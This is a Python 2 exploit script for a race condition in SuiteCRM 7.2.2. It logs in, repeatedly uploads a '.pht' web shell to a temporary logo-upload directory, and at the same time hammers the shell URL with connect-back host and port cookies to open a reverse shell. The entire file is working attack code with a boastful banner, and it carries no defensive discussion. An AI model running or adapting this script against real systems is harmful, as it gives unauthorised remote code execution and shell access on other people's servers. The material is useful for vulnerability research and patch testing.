#!/usr/bin/python2
# coding: utf-8
# Author: Darren Martyn, Xiphos Research Ltd.
# Version: 20150804.1
# Licence: WTFPL - wtfpl.net
import threading
import requests
import random
import time
import sys
__version__ = "20150804.1"
clear = "\x1b[0m"

def type_message(message):
    for character in message:
        sys.stdout.write(character)
        sys.stdout.flush()
        time.sleep(0.02)

def banner():
    suite = """%s
        ▄████████ ███    █▄   ▄█      ███        ▄████████     
       ███    ███ ███    ███ ███  ▀█████████▄   ███    ███     
       ███    █▀  ███    ███ ███▌    ▀███▀▀██   ███    █▀      
       ███        ███    ███ ███▌     ███   ▀  ▄███▄▄▄         
     ▀███████████ ███    ███ ███▌     ███     ▀▀███▀▀▀         
              ███ ███    ███ ███      ███       ███    █▄      
        ▄█    ███ ███    ███ ███      ███       ███    ███     
      ▄████████▀  ████████▀  █▀      ▄████▀     ██████████

   ▄████████    ▄████████  ▄████████    ▄████████    ▄████████ 
  ███    ███   ███    ███ ███    ███   ███    ███   ███    ███ 
  ███    ███   ███    ███ ███    █▀    ███    █▀    ███    ███ 
 ▄███▄▄▄▄██▀   ███    ███ ███         ▄███▄▄▄      ▄███▄▄▄▄██▀ 
▀▀███▀▀▀▀▀   ▀███████████ ███        ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   
▀███████████   ███    ███ ███    █▄    ███    █▄  ▀███████████ 
  ███    ███   ███    ███ ███    ███   ███    ███   ███    ███ 
  ███    ███   ███    █▀  ████████▀    ██████████   ███    ███ 
  ███    ███   because we be faster than unlink()   ███    ███ \n"""  %("\x1b[1;34m")
    type_message(suite)
    message = "%sSuiteCRM 7.2.2-max Race Condition Exploit, enabled by clueless\n patching. Version: %s, Author: Darren Martyn.%s\n" %("\x1b[1;36m",__version__, clear)
    type_message(message)
    sys.stdout.write(clear)
    sys.stdout.flush()

### login and return session object. done ONCE.

def get_session(base_url, username, password): # returns session object
    url = base_url + "index.php"
    session = requests.Session()
    data = {'module': 'Users',
            'action': 'Authenticate',
            'return_module': 'Users',
            'return_action': 'Login',
            'cant_login': '',
            'login_module': '',
            'login_action': '',
            'login_record': '',
            'login_token': '',
            'login_oauth_token': '',
            'login_mobile': '',
            'login_language': 'en_us',
            'user_name': username,
            'user_password': password,
            'Login': 'Log In'}
    print "\x1b[1;32m{+} Logging into the CRM...\x1b[0m"
    try:
        r = session.post(url=url, data=data)
    except Exception, e:
        sys.exit("\x1b[1;31m{-} Something failed. Stacktrace coming...\n\x1b[0m %s" %(str(e)))
    if r.status_code == 200:
        return session
    else:
        sys.exit("\x1b[1;31m{-} Something went wrong...\x1b[0")

### upload shell. happens a LOT.

def upload_shell(base_url, session, payload):
    url = base_url + "index.php"
    files={"file_1":("suiteshell.pht", open(payload, "rb").read())}
    data = {'entryPoint': 'UploadFileCheck',
            'forQuotes': 'false'}
    print "\x1b[1;32m{+} Uploading our shell...\x1b[0m"
    try:
        r = session.post(url=url, data=data, files=files)
    except Exception, e:
        sys.exit("\x1b[1;31m{-} Something failed. Bollocks. Stacktrace coming...\n\x1b0m %s" %(str(e)))
    if r.status_code == 200:
        pass
    else:
        sys.exit("\x1b[1;31m{-} Something went wrong...\x1b[0m")

### try spawn callback. this and shell up race.

def spawn_backconnect(shell_url, cb_host, cb_port):
    cookies = {'host': cb_host, 'port': cb_port}
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0'}
    try:
        print "\x1b[1;32m{*} Sending our payload...\x1b[0m"
        r = requests.get(url=shell_url, headers=headers, verify=False, cookies=cookies)
    except Exception, e:
        sys.exit(str(e))
    if r.text:
        if "got shell" in r.text: # this needs fixing so it actually exits...
            sys.exit("\x1b[1;31mPWNAGE COMPLETE! TOTALLY REKT!")
        else:
            pass
            
### threadable funcs
def upshell(base_url, session, payload):
    while True:
        upload_shell(base_url, session, payload)
        
def hackloop(shell_url, cb_host, cb_port):
    while True:
        spawn_backconnect(shell_url, cb_host, cb_port)
            
def exploitus_logicus(base_url, username, password, payload, cb_host, cb_port):
    try:
        session = get_session(base_url, username, password)
    except:
	    sys.exit("Session Not Obtained!")
    shell_url = base_url + "upload/tmp_logo_company_upload/suiteshell.pht"
    threading.Thread(target=hackloop, args=(shell_url, cb_host, cb_port,)).start()
    threading.Thread(target=upshell, args=(base_url, session, payload,)).start()
    
def main(args):
    banner()
    if len(args) != 7:
        sys.exit("usage: %s <base url> <username> <password> <payload> <connectback host> <connectback port>" %(args[0]))
    exploitus_logicus(base_url=args[1], username=args[2], password=args[3], payload=args[4], cb_host=args[5], cb_port=args[6])

if __name__ == "__main__":
    main(args=sys.argv)
